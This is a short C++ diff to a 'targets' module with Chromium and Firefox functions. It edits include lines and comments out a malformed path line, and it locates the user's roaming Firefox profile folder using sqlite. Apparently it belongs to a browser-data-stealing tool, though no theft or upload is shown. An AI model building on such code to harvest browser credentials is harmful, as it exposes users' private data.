@@ -22,9 +22,9 @@
 -----------------------------------------------------------------
 */
 
-#include "../targets.hpp"
-#include "../../config/config.cpp"
-#include "../../helper/helper.hpp"
+#include "../targets.h"
+#include "../../config/config.c"
+#include "../../helper/helper.h"
 #include <fstream>
 #include <vector>
 #include "../../dependencies/sqlite/sqlite3.h"
@@ -147,7 +147,7 @@ void browsers::Chromium()
 void browsers::FireFox()
 {
     std::string path = global::roaming + "/Mozilla/Firefox";
-    std::string defPaths[] = global::defaultPath + "/Firefox";
+    //std::string defPaths[] = global::defaultPath + "/Firefox";
 
     if (std::filesystem::exists(path))
     {
